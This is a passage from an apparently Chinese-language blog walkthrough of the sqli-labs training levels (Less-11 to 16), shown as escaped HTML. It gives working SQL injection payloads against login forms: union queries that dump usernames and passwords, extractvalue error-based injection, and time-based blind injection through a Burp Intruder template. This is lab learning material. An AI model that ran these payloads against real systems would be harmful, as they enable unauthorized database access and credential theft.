&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=zhatian%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;users&amp;#x27;+--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your Login name:1&amp;lt;br&amp;gt;Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆字段值:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=zhatian%27 union select 1,group_concat(concat_ws(&amp;#x27;--&amp;#x27;,username,password)) from users +--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your Login name:1&amp;lt;br&amp;gt;Your Password:Dumb--Dumb,Angelina--I-kill-you,Dummy--p@ssword,secure--crappy,stupid--stupidity,superman--genious,batman--mob!le,admin--admin,admin1--admin1,admin2--admin2,admin3--admin3,dhakkan--dumbo,admin4--admin4&amp;lt;br&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面的都是常规操作了&lt;/p&gt;
&lt;h2 id=&#34;总结-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-11&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;sqlmap 测 post 请求可以用参数 forms，直接获取表单，可以使用 - r 参数读取请求文件，或者通过–data 参数测试，具体情况具体百度&lt;/p&gt;
&lt;p&gt;-r 读取的文件可以用 bp 抓包，右键 copy to file，直接导出 txt 文件&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-12&#34;&gt;#&lt;/a&gt; Less-12&lt;/h1&gt;
&lt;h2 id=&#34;过程-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-12&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;date：2020-11-21 17:21:22&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-12&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-12&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;上 bp 抓包&lt;/p&gt;
&lt;p&gt;发现双引号报错，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;quot;+or+1%3D1+--+&amp;amp;passwd=1234&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我？？？&lt;/p&gt;
&lt;p&gt;生气的乱搞了:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;quot;5678+or+1%3D1+--+&amp;amp;passwd=1234&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;5678 or 1=1 -- &amp;quot;) and password=(&amp;quot;1234&amp;quot;) LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这下出来了把，后面是 &amp;quot;)，再加个括号闭合一下下，分别 order by2 和 3，确定是两个字段&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin123455&amp;quot;)+order by 3--+&amp;amp;passwd=1234&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出当前数据库～&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin123455&amp;quot;)+union select 1,database()--+&amp;amp;passwd=1234&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your Login name:1&amp;lt;br&amp;gt;Your Password:security&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后续操作参考 less-11&lt;/p&gt;
&lt;h2 id=&#34;总结-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-12&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;和上一关比就是单引号闭合变成 &amp;quot;) 闭合了，和前面十关做的题目一样呀，后面不会还是一样的吧，然后写完盲注就没了把&lt;/p&gt;
&lt;p&gt;唉，我觉得我的专注力有点不太够，才写了几道题啊，还花了这么长时间，真是废物&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-13&#34;&gt;#&lt;/a&gt; Less-13&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 18:08:01&lt;/p&gt;
&lt;h2 id=&#34;过程-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-13&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-13&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-13&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;盲猜这题是 &#39;)) 闭合，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin%27%29%29+or+1%3D1+--+23&amp;amp;passwd=32&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;) or 1=1 -- 23&amp;#x27;) and password=(&amp;#x27;32&amp;#x27;) LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦豁，是 &#39;) 闭合，生气！闭合：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27;) or 1=1+--+23&amp;amp;passwd=32&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出只有一张图片，表示闭合成功，没有数据回显&lt;/p&gt;
&lt;p&gt;那就用报错来看数据呗，正好报错注入的函数我用的少&lt;/p&gt;
&lt;p&gt;extractvalue (目标 xml 文档，xml 路径) 用于查询 xml 文件&lt;/p&gt;
&lt;p&gt;第二个参数 xml 中的位置是可操作的地方，xml 文档中查找字符位置是用 /xxx/xxx/xxx/… 这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27;) and extractvalue(1,concat(&amp;#x27;~&amp;#x27;,database()))+--+23&amp;amp;passwd=32&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出得到当前数据库名：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;XPATH syntax error: &amp;#x27;~security&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿别的数据在 xml 路径那里改 payload 即可，参考 less-11&lt;/p&gt;
&lt;h2 id=&#34;总结-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-13&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/wocalieshenmegui/p/5917967.html&#34;&gt;十种 sql 报错注入姿势总结&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-14&#34;&gt;#&lt;/a&gt; Less-14&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 19:47:21&lt;/p&gt;
&lt;h2 id=&#34;过程-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-14&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-14&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-14&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;直接双引号闭合了，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;quot; order by 666+--+&amp;amp;passwd=123&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Unknown column &amp;#x27;666&amp;#x27; in &amp;#x27;order clause&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;能闭合了就随便用之前的哪个方法拿数据都可以啦，用报错注入拿个数据库名：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;quot; and extractvalue(1,concat(&amp;#x27;~&amp;#x27;,database()))+--+&amp;amp;passwd=123&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;XPATH syntax error: &amp;#x27;~security&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;别的同 Less-11&lt;/p&gt;
&lt;h2 id=&#34;总结-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-14&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这，没啥&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-15&#34;&gt;#&lt;/a&gt; Less-15&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 20:03:27&lt;/p&gt;
&lt;h2 id=&#34;过程-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-15&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-15&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 less-11&lt;/p&gt;
&lt;h3 id=&#34;手工注入-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-15&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;看标题，布尔盲注，行叭，上 bp 抓包&lt;/p&gt;
&lt;p&gt;单引号闭合后接 order by 2，给的是 flag.jpg&lt;/p&gt;
&lt;p&gt;接 order by 2，给的是 slap.jpg&lt;/p&gt;
&lt;p&gt;明显 flag.jpg 的就是登陆成功嘛&lt;/p&gt;
&lt;p&gt;说明单引号闭合成功且需要的是两个字段：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; order by 3+--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;还是先利用 if 判断，把数据库名字长度搞出来，利用一下 payload，服务器沉睡了好一会才醒来，那么长度就是 8 啦！&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and if( length(database())=8,sleep(23),1 )+--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一个一个字符猜，这种搬砖的活还是交给 bp 把&lt;/p&gt;
&lt;p&gt;右键 send to Intruder，attack type 选 cluster bomb:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /Less-15/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-15/Content-Type: application/x-www-form-urlencodedContent-Length: 81Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;#x27; and if( ascii(substr(database(),§1§,1))=§8§,sleep(23),1 )+--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;request&lt;/th&gt;
&lt;th&gt;payload1&lt;/th&gt;
&lt;th&gt;payload2&lt;/th&gt;
&lt;th&gt;status&lt;/th&gt;
&lt;th&gt;timeout&lt;/th&gt;
&lt;th&gt;error&lt;/th&gt;
&lt;th&gt;length&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;787&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;99&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;802&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;838&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;105&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;909&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;114&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;913&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;115&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;927&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;116&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;932&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;117&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;968&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;121&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1691&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1737&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1737&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1737&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;1737&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;总结-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-15&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-16&#34;&gt;#&lt;/a&gt; Less-16&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 22:33:47&lt;/p&gt;
&lt;h2 id=&#34;过程-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-16&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-16&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
